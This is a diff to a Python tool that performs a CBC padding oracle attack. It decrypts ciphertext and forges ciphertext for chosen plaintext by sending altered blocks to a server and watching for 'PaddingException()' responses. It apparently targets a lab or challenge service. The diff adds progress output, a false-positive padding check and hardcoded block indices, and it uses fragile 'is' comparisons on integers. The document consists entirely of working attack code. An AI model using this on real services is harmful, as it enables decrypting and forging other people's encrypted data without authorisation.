@@ -9,6 +9,8 @@ from tqdm import tqdm
 def padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_original, base_url, block_size, verbose=True):
     """CBC padding oracle for encryption"""
 
+    print("Encrypting '{}' ... ".format(plain_text_manipulated))
+
     #################################################################
     # Data preparation
     #################################################################
@@ -30,13 +32,20 @@ def padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_ori
     plain_text_manipulated        = pad(plain_text_manipulated, block_size)
     plain_text_manipulated_blocks = split_into_blocks(plain_text_manipulated, block_size)
 
+    if len(cipher_blocks) is not len(plain_text_original_blocks) + 1:
+        raise Exception("Error occurred! Cipher text and plain text (original) do not fit regarding length.")
+
     # Keep last cipher block
-    cipher_text_manipulated = cipher_blocks[len(plain_text_manipulated_blocks)]
+    cipher_text_manipulated = cipher_blocks[2]
 
     # We know the intermediate state for the last block
-    cur_intermediate = XOR_byte_list(plain_text_original_blocks[len(plain_text_manipulated_blocks) - 1], cipher_blocks[len(plain_text_manipulated_blocks) - 1])
+    # @todo: Replace hardcoded indices by last elements from given cipher/original
+    cur_intermediate = XOR_byte_list(plain_text_original_blocks[1], cipher_blocks[1])
+    #     cur_intermediate = XOR_byte_list(plain_text_original_blocks[-1], cipher_blocks[-1])
 
     for plain_block_index in range(len(plain_text_manipulated_blocks), 0, -1):
+
+        print("Encrypting block {}/{} ... ".format( len(plain_text_manipulated_blocks) - plain_block_index + 1, len(plain_text_manipulated_blocks)))
 
         # Construct new cipher block for manipulated plain text
         cur_cipher = XOR_byte_list(cur_intermediate, plain_text_manipulated_blocks[plain_block_index - 1])
@@ -50,13 +59,18 @@ def padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_ori
         # Use only first cipher text blocks for now
         cipher_text_manipulated = cur_cipher + cipher_text_manipulated 
 
+
+        print("")
+
     # Send the changed data to server and check response
-    return evaluate_data( encode_data(cipher_text_manipulated), base_url=base_url )
+    return cipher_text_manipulated
 
 
 
 def padding_oracle_decrypt(data, base_url, block_size, verbose=True):
     """CBC padding oracle for decryption"""
+
+    print("Decrypting '{}' ... ".format(data))
 
     #################################################################
     # Data preparation
@@ -85,12 +99,11 @@ def padding_oracle_decrypt(data, base_url, block_size, verbose=True):
     for block_id in range(len(cipher_blocks) - 2, -1, -1):
         # Get plain text value of missing bytes
         bytes_guessed = {}
-        num_padding_bytes = 0
-        for index in range(block_size - num_padding_bytes - 1, -1, -1):
 
-            #print("Guessing block {} byte {} ...".format(block_id + 1, index))
+        for index in range(block_size - 1, -1, -1):
+
             # Pretent to have more padding bytes
-            cur_num_padding_bytes = num_padding_bytes + (block_size - num_padding_bytes - index) 
+            cur_num_padding_bytes =  block_size - index
         
             # Change padding-related bytes in forelast block in such way that the same bytes 
             # in the plain text will increment to pretend to have more padding bytes
@@ -101,18 +114,10 @@ def padding_oracle_decrypt(data, base_url, block_size, verbose=True):
                 cipher_blocks_tmp.append( cipher_blocks[i] )
                 
             for i in range(block_size - cur_num_padding_bytes + 1, block_size):
-                # # Check if byte is pretended or an actual padding byte
-                if i < block_size - num_padding_bytes:
-                    # Handle pretended padding bytes 
-                    old_value = bytes_guessed[i][1]
-                    padding_bytes = bytes_guessed[i][0]
-                    new_value = old_value ^ padding_bytes ^ cur_num_padding_bytes
-                else:
-                    # Increment actual padding bytes
-                    old_value = cipher_blocks_tmp[block_id][i]
-                    padding_bytes = num_padding_bytes
-                    new_value = ord(old_value) ^ padding_bytes ^ cur_num_padding_bytes
-
+                # Handle pretended padding bytes 
+                old_value = bytes_guessed[i][1]
+                padding_bytes = bytes_guessed[i][0]
+                new_value = old_value ^ padding_bytes ^ cur_num_padding_bytes
                 cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], i, new_value)
             
             # In the next step we find the correct value of the additional pretended padding byte that will not throw PaddingException()
@@ -127,6 +132,20 @@ def padding_oracle_decrypt(data, base_url, block_size, verbose=True):
             
                 # Check if PaddingException() occurs
                 if "PaddingException()" not in response.text:
+                    # Check corner case: Check that last byte in plain text is for sure 0x01. 
+                    # Avoid that following byte is is accindentely padding byte (0x02) which would also be fine with padding, 
+                    if index is block_size - 1:
+                        # Changing next bit and see if padding still is correct
+                        cipher_blocks_tmp_2nd = cipher_blocks_tmp[block_id]
+                        cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], index - 1, ord(cipher_blocks_tmp[block_id][index - 1]) + 1)
+                        # Send the changed data to server and check response
+                        response_2nd = evaluate_data( encode_data("".join(cipher_blocks_tmp)), base_url=base_url )
+                        cipher_blocks_tmp[block_id] = cipher_blocks_tmp_2nd
+
+                        if "PaddingException()" in response_2nd.text:
+                            # False positive padding
+                            continue
+
                     # Do the math to get the actual plaintext value by having a valid plain text byte and related IV byte
                     plain_text_value = cur_num_padding_bytes ^ value ^ ord(cipher_blocks[block_id][index])
                     plain_text.insert(0, plain_text_value) 
